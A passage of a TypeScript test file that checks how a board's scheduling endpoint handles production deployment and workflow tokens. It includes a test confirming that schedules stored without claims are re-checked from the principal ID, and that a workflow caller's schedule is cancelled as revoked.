        const queue = fakeQueue()
        const board = testBoard({ scheduler: queue.scheduler })
        if (make === 'client') await board.as('ops').schedule('ops', { text: 'from ops', in: '1h' })
        else expect((await caller(board.fetch, await deploymentToken('board', PROJECT_ID))('POST', '/schedules', { channel: 'ops', text: 'from prod', in: '1h' })).status).toBe(201)
        expect(await sendAndRead(board.fetch, queue), make).toMatchObject({ state: 'done', sent: 1 })
      }
    } finally {
      vi.unstubAllEnvs()
    }
  })

  it('from before the board kept claims are re-checked from the principal ID', async () => {
    vi.stubEnv('VERCEL_ENV', 'production')
    try {
      const sent: Record<string, unknown> = {}
      const callers = {
        own: () => deploymentToken('board', PROJECT_ID),
        byId: () => deploymentToken('marketing', 'prj_marketing'),
        workflow: () => workflowToken(),
      }
      for (const [who, token] of Object.entries(callers)) {
        // A store that drops the claims from each schedule, as a board before this one wrote it.
        const store = memory()
        const log = store.log!
        const append = log.append.bind(log)
        log.append = ((session, events, options) =>
          append(
            session,
            events.map((event: any) => {
              if (event.type !== 'schedule.created') return event
              const { facts: _facts, ...principal } = event.payload.as.principal
              return { ...event, payload: { ...event.payload, as: { ...event.payload.as, principal } } }
            }),
            options,
          )) as typeof log.append
        const queue = fakeQueue()
        const grants: GrantInput[] = [
          { principals: [{ kind: 'project', project: 'prj_marketing', environments: ['production'] }], can: { '*': 'all' } },
          www({ '*': 'all' }),
        ]
        const board = await granting(grants, { store, scheduler: queue.scheduler })
        expect((await caller(board.fetch, await token())('POST', '/schedules', { channel: 'dev', text: who, in: '1h' })).status).toBe(201)
        const schedule = await sendAndRead(board.fetch, queue)
        sent[who] = { sent: schedule.sent, reason: schedule.canceled?.reason ?? null }
        vi.setSystemTime(T0)
      }
      expect(sent).toEqual({
        own: { sent: 1, reason: null },
        byId: { sent: 1, reason: null },
        workflow: { sent: 0, reason: 'revoked' },
      })
    } finally {
      vi.unstubAllEnvs()
    }
  })
})
